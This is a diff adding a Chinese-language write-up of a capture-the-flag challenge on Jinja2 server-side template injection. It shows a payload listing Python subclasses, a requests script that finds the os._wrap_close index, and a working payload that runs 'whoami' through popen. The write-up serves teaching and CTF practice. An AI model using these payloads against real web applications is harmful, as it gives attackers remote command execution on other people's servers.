@@ -83,3 +83,109 @@ ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako torna
 def index():
    return render_template("index.html",title='Home',user=request.args.get("key"))
 ````
+
+<br>
+
+## 解题思路
+
+1.找到模板注入点
+
+<br>
+
+2.先查看所有的子类
+
+````
+{{"".__class__.__bases__[0].__subclasses__()}}
+````
+
+<br>
+
+然后寻找可用子类并且获得它的序号
+````
+import requests
+from bs4 import BeautifulSoup
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+def crawl(url):
+    try:
+        # 发送请求
+        response = requests.get(url, verify=False)
+
+        # 检查请求是否成功
+        if response.status_code == 200:
+            # 返回网页的HTML内容
+            return response.text
+        else:
+            print(f"请求失败，状态码: {response.status_code}")
+            return None
+    except requests.exceptions.RequestException as e:
+        print(f"请求发生异常: {e}")
+        return None
+
+
+def truncate_at_string(text, target_string):
+    # 找到目标字符串在文本中的位置
+    pos = text.find(target_string)
+    if pos == -1:
+        return "目标字符串未找到"
+
+    # 截取文本至目标字符串位置（不包括目标字符串本身）
+    truncated_text = text[:pos]
+
+    return truncated_text
+
+def count_substring_occurrences(text, substring):
+    # 使用 count 方法统计子字符串出现的次数
+    count = text.count(substring)
+    return count
+
+
+#确定寻找的子类
+target_string = "os._wrap_close"
+
+url = b"https://d2da0681-9d65-4e0b-8a88-64c4a7cf0ab0.challenge.ctf.show/hello/%7B%7B%22%22.__class__.__bases__[0].__subclasses__()%7D%7D"
+html_content = crawl(url)
+te = truncate_at_string(html_content, target_string)
+
+#开始数
+stringwant = "&#39"
+mem = count_substring_occurrences(te,stringwant)
+print (f"你想要找到的子类{target_string}列表号是")
+print((mem-1)/2)
+
+#print(te)
+
+#if html_content:
+#    print(f"全部子类:\n{html_content}")
+
+
+````
+
+<br>
+
+
+这里我获得的序号是132
+
+<br>
+
+3.命令执行
+
+````
+{{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()}}
+````
+
+
+
+
+
+
+
+
+
+
+
+
+
+
